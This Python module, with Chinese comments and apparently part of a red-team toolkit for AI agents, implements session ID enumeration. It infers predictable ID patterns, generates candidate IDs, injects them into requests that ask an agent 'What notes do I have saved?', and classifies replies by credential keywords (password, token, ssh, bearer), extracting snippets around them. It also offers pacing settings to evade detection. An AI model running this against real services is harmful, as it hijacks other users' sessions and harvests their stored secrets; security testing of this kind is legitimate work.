# -*- coding: utf-8 -*-
"""SessionEnumerator - 会话枚举攻击引擎

实现对可预测 session_id 格式的自动化枚举攻击。
支持模式模板生成、响应智能分类、隐蔽性控制。

核心组件:
    - SessionIDPattern: session ID 模式模板解析
    - SessionIDGenerator: 基于模式模板生成候选 session_id
    - ResponseClassifier: 三级分类 (空/有价值/敏感)
    - EnumerationRequestBuilder: 枚举请求构造器
    - SessionEnumerationReport: 枚举结果报告

Academic basis:
    - OWASP ASI09: Broken Authentication — Session enumeration
    - CWE-287: Improper Authentication — Session ID predictability
    - IDOR: Session hijacking via enumeration
    - Crothers et al. (arXiv:2306.05685) — Adaptive attack timing evasion
"""

from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Iterator

logger = logging.getLogger(__name__)


@dataclass
class SessionIDPattern:
    """Session ID 模式模板

    支持占位符:
        - {date:FORMAT}: 日期格式化 (如 {date:%Y%m%d})
        - {counter:WIDTH}: 零填充计数器 (如 {counter:04d})
    """

    template: str
    date_format: str = "%Y%m%d"
    counter_width: int = 4

    def __post_init__(self) -> None:
        """从模板提取 date_format 和 counter_width."""
        date_match = re.search(r"\{date:([^}]+)\}", self.template)
        if date_match:
            self.date_format = date_match.group(1)
        counter_match = re.search(r"\{counter:(\d+)d\}", self.template)
        if counter_match:
            self.counter_width = int(counter_match.group(1))


class SessionIDGenerator:
    """候选 session_id 序列生成器

    根据模式模板和时间范围生成可预测的 session ID 序列。
    """

    def __init__(
        self,
        pattern: SessionIDPattern,
        date_start: datetime,
        date_end: datetime,
        counter_max: int = 20,
    ) -> None:
        self._pattern = pattern
        self._date_start = min(date_start, date_end)
        self._date_end = max(date_start, date_end)
        self._counter_max = counter_max

    def generate(self) -> Iterator[str]:
        """生成 session_id 序列 (日期优先, 计数器次之)."""
        current_date = self._date_end
        while current_date >= self._date_start:
            date_str = current_date.strftime(self._pattern.date_format)
            for counter in range(1, self._counter_max + 1):
                counter_str = f"{counter:0{self._pattern.counter_width}d}"
                session_id = self._pattern.template
                session_id = re.sub(r"\{date:[^}]+\}", date_str, session_id)
                session_id = re.sub(r"\{counter:\d+d\}", counter_str, session_id)
                yield session_id
            current_date -= timedelta(days=1)

    def estimate_total(self) -> int:
        """估算总生成数量."""
        days = (self._date_end - self._date_start).days + 1
        return days * self._counter_max


class ResponseCategory(str, Enum):
    """响应分类枚举."""

    EMPTY = "empty"
    VALUABLE = "valuable"
    SENSITIVE = "sensitive"


class ResponseClassifier:
    """响应内容三级分类器

    将 agent 响应分为三类:
        - EMPTY: 空会话 (无存储数据)
        - VALUABLE: 有价值数据 (用户笔记, 非敏感)
        - SENSITIVE: 敏感数据 (密码, token, 凭证)
    """

    DEFAULT_EMPTY_INDICATORS: list[str] = [
        "haven't saved",
        "no notes",
        "no reminders",
        "nothing stored",
        "haven't stored",
        "no saved",
        "currently have no",
        "couldn't find",
        "unable to find",
        "no entries",
        "don't have any",
        "no records",
        "empty",
    ]
    DEFAULT_SENSITIVE_KEYWORDS: list[str] = [
        "password",
        "token",
        "api_key",
        "apikey",
        "access_key",
        "secret",
        "credential",
        "ssh",
        "private_key",
        "private",
        "authorization",
        "bearer",
        "jwt",
        "connection_string",
        "jira",
        "admin",
        "sudo",
        "root",
    ]

    def __init__(
        self,
        empty_indicators: list[str] | None = None,
        sensitive_keywords: list[str] | None = None,
    ) -> None:
        self._empty_indicators = [ind.lower() for ind in (empty_indicators or self.DEFAULT_EMPTY_INDICATORS)]
        self._sensitive_keywords = [kw.lower() for kw in (sensitive_keywords or self.DEFAULT_SENSITIVE_KEYWORDS)]

    def classify(self, response_text: str) -> ResponseCategory:
        """分类响应内容."""
        if not response_text:
            return ResponseCategory.EMPTY
        text_lower = response_text.lower()
        for keyword in self._sensitive_keywords:
            if keyword in text_lower:
                return ResponseCategory.SENSITIVE
        for indicator in self._empty_indicators:
            if indicator in text_lower:
                return ResponseCategory.EMPTY
        return ResponseCategory.VALUABLE

    def extract_sensitive_snippets(
        self,
        response_text: str,
        context_chars: int = 100,
    ) -> list[str]:
        """提取敏感关键词上下文片段."""
        if not response_text:
            return []
        text_lower = response_text.lower()
        snippets: list[str] = []
        for keyword in self._sensitive_keywords:
            idx = text_lower.find(keyword)
            while idx != -1:
                start = max(0, idx - context_chars)
                end = min(len(response_text), idx + len(keyword) + context_chars)
                snippet = response_text[start:end].strip()
                if snippet and snippet not in snippets:
                    snippets.append(snippet)
                idx = text_lower.find(keyword, idx + 1)
        return snippets


@dataclass
class EnumerationFinding:
    """单次枚举发现."""

    session_id: str
    category: ResponseCategory
    response_excerpt: str = ""
    sensitive_snippets: list[str] = field(default_factory=list)


@dataclass
class SessionEnumerationReport:
    """会话枚举攻击报告."""

    total_enumerated: int = 0
    empty_count: int = 0
    valuable_count: int = 0
    sensitive_count: int = 0
    findings: list[EnumerationFinding] = field(default_factory=list)
    duration_seconds: float = 0.0
    session_id_pattern: str = ""
    target_endpoint: str = ""

    @property
    def active_sessions(self) -> int:
        """活跃会话数."""
        return self.valuable_count + self.sensitive_count

    @property
    def sensitive_rate(self) -> float:
        """敏感数据发现率."""
        if self.total_enumerated == 0:
            return 0.0
        return self.sensitive_count / self.total_enumerated

    def to_dict(self) -> dict[str, Any]:
        """转换为 JSON-serializable dict."""
        return {
            "total_enumerated": self.total_enumerated,
            "empty_count": self.empty_count,
            "valuable_count": self.valuable_count,
            "sensitive_count": self.sensitive_count,
            "active_sessions": self.active_sessions,
            "sensitive_rate": round(self.sensitive_rate, 4),
            "duration_seconds": round(self.duration_seconds, 2),
            "session_id_pattern": self.session_id_pattern,
            "target_endpoint": self.target_endpoint,
            "findings": [
                {
                    "session_id": f.session_id,
                    "category": f.category.value,
                    "response_excerpt": f.response_excerpt[:200],
                    "sensitive_snippets": f.sensitive_snippets[:3],
                }
                for f in self.findings
            ],
        }


class EnumerationRequestBuilder:
    """构造枚举请求 (替换 session_id).

    复用现有 SessionInjector 逻辑，向请求注入候选 session_id。
    """

    def __init__(
        self,
        template_request: str,
        session_field: str = "session_id",
    ) -> None:
        self._template = template_request
        self._session_field = session_field

    def build_request(self, session_id: str) -> str:
        """构造包含指定 session_id 的请求."""
        if "{CHAT_ID}" in self._template:
            return self._template.replace("{CHAT_ID}", session_id)
        return self._inject_into_body(self._template, session_id)

    def _inject_into_body(self, request: str, session_id: str) -> str:
        """向请求 body 注入 session_id."""
        parts = request.split("\r\n\r\n", 1)
        if len(parts) < 2:
            parts = request.split("\n\n", 1)
        if len(parts) < 2:
            return request
        header_section = parts[0]
        body = parts[1]
        try:
            body_obj = json.loads(body)
            if isinstance(body_obj, dict):
                body_obj[self._session_field] = session_id
                new_body = json.dumps(body_obj, ensure_ascii=False)
                return header_section + "\r\n\r\n" + new_body
        except (json.JSONDecodeError, TypeError):
            pass
        return request


# ====================================================================
# Session ID 模式自动推断器 (Pattern Inference Engine)
# ====================================================================


class SessionPatternInferer:
    """Session ID 模式自动推断器

    从实际 session_id 样本中自动识别模式模板，驱动枚举生成器。
    与 session_id_analyzer.py 中的 SessionIDAnalyzer 互补:
        - SessionIDAnalyzer: 分析熵值、风险等级、搜索空间
        - SessionPatternInferer: 提取可生成的模式模板

    支持自动识别的模式:
        - 日期格式: 20260325, 2026-03-25, 03/25/2026 → {date:FORMAT}
        - 计数器: 0015, 000042 → {counter:WIDTHd}
        - UUID: 550e8400-e29b-... → {uuid}
        - 纯数字: 123456 → {counter:WIDTHd}
        - 前缀+计数器: session_0042 → prefix_{counter:WIDTHd}
        - 随机字符串: abc123xyz → {random}

    Example:
        inferer = SessionPatternInferer()

        # 识别日期+计数器模式
        pattern = inferer.infer_pattern("MC-20260325-0015")
        # result: "MC-{date:%Y%m%d}-{counter:04d}"

        # 识别 ISO 日期格式
        pattern = inferer.infer_pattern("sess-2026-03-25-0001")
        # result: "sess-{date:%Y-%m-%d}-{counter:04d}"

        # 识别纯数字模式
        pattern = inferer.infer_pattern("000042")
        # result: "{counter:06d}"
    """

    # 日期正则模式 (按优先级排序)
    _DATE_PATTERNS: list[tuple[str, str]] = [
        # 8位日期: 20260325 → %Y%m%d
        (r"\d{8}", "%Y%m%d"),
        # 6位日期: 260325 → %y%m%d
        (r"\d{6}", "%y%m%d"),
        # ISO日期: 2026-03-25 → %Y-%m-%d
        (r"\d{4}-\d{2}-\d{2}", "%Y-%m-%d"),
        # 美式日期: 03/25/2026 → %m/%d/%Y
        (r"\d{2}/\d{2}/\d{4}", "%m/%d/%Y"),
        # 短横线: 26-03-25 → %y-%m-%d
        (r"\d{2}-\d{2}-\d{2}", "%y-%m-%d"),
    ]

    # UUID 正则
    _UUID_PATTERN = re.compile(
        r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
        re.IGNORECASE,
    )

    @classmethod
    def infer_pattern(cls, session_id: str) -> str:
        """从 session_id 样本推断模式模板

        自适应识别多种格式，无需用户手动指定模式。

        Args:
            session_id: 实际 session_id 样本

        Returns:
            推断出的模式模板字符串
        """
        if not session_id:
            return "{counter:04d}"

        # 检测 UUID
        if cls._UUID_PATTERN.match(session_id):
            return "{uuid}"

        # 尝试识别日期 + 计数器混合模式
        date_parts = cls._extract_date_parts(session_id)
        if date_parts:
            return cls._build_pattern_with_date(session_id, date_parts)

        # 尝试纯计数器模式
        counter_pattern = cls._extract_counter(session_id)
        if counter_pattern:
            return counter_pattern

        # 尝试前缀 + 计数器模式
        prefix_counter = cls._extract_prefix_counter(session_id)
        if prefix_counter:
            return prefix_counter

        # 默认: 视为随机字符串
        return "{random}"

    @classmethod
    def _extract_date_parts(cls, session_id: str) -> list[tuple[str, str, int, int]] | None:
        """提取 session_id 中的日期部分."""
        results: list[tuple[str, str, int, int]] = []

        for regex, fmt in cls._DATE_PATTERNS:
            for match in re.finditer(regex, session_id):
                date_str = match.group()
                try:
                    datetime.strptime(date_str, fmt)
                    results.append((date_str, fmt, match.start(), match.end()))
                except ValueError:
                    continue

        return results if results else None

    @classmethod
    def _build_pattern_with_date(
        cls,
        session_id: str,
        date_parts: list[tuple[str, str, int, int]],
    ) -> str:
        """构建包含日期的模式模板."""
        date_str, date_fmt, date_start, date_end = date_parts[0]

        prefix = session_id[:date_start]
        suffix = session_id[date_end:]
        suffix_pattern = cls._analyze_suffix(suffix)

        return f"{prefix}{{date:{date_fmt}}}{suffix_pattern}"

    @classmethod
    def _analyze_suffix(cls, suffix: str) -> str:
        """分析后缀部分 (计数器 or 随机).

        保留原始分隔符 (- 或 _)，仅替换数字部分。
        """
        if not suffix:
            return ""

        # 提取前导分隔符
        separator = ""
        clean = suffix
        while clean and clean[0] in "-_":
            separator += clean[0]
            clean = clean[1:]

        if clean.isdigit():
            # 只保留最后一个分隔符，计数器使用零填充格式
            sep = separator[-1] if separator else ""
            return f"{sep}{{counter:0{len(clean)}d}}"

        if clean:
            return separator + "{random}"

        return suffix

    @classmethod
    def _extract_counter(cls, session_id: str) -> str | None:
        """提取纯数字计数器模式."""
        if session_id.isdigit():
            return f"{{counter:0{len(session_id)}d}}"
        return None

    @classmethod
    def _extract_prefix_counter(cls, session_id: str) -> str | None:
        """提取前缀 + 计数器模式.

        例如: "session_000042" → "session_{counter:06d}"
        """
        match = re.match(r"^(.+?)[-_](\d+)$", session_id)
        if match:
            prefix = match.group(1)
            counter = match.group(2)
            return f"{prefix}_{{counter:0{len(counter)}d}}"

        match = re.match(r"^([a-zA-Z_-]+)(\d+)$", session_id)
        if match:
            prefix = match.group(1)
            counter = match.group(2)
            prefix = prefix.rstrip("-_")
            return f"{prefix}_{{counter:0{len(counter)}d}}"

        return None

    @classmethod
    def analyze_batch(cls, session_ids: list[str]) -> dict[str, Any]:
        """批量分析 session_id 样本，返回统计信息."""
        if not session_ids:
            return {"count": 0, "patterns": []}

        patterns: dict[str, int] = {}
        for sid in session_ids:
            pattern = cls.infer_pattern(sid)
            patterns[pattern] = patterns.get(pattern, 0) + 1

        most_common = max(patterns, key=patterns.get) if patterns else ""

        return {
            "count": len(session_ids),
            "unique_patterns": len(patterns),
            "most_common_pattern": most_common,
            "pattern_distribution": patterns,
        }


ENUMERATION_DEFAULTS: dict[str, Any] = {
    "session_enum_enabled": False,
    "session_enum_pattern": "",
    "session_enum_date_start": "",
    "session_enum_date_end": "",
    "session_enum_days_back": 14,
    "session_enum_counter_max": 20,
    "session_enum_prompt": "What notes do I have saved?",
    "session_enum_max_concurrency": 1,
    "session_enum_request_delay": 2.0,
    "session_enum_max_requests": None,
    "session_enum_sensitive_keywords": "",
    "session_enum_empty_indicators": "",
}
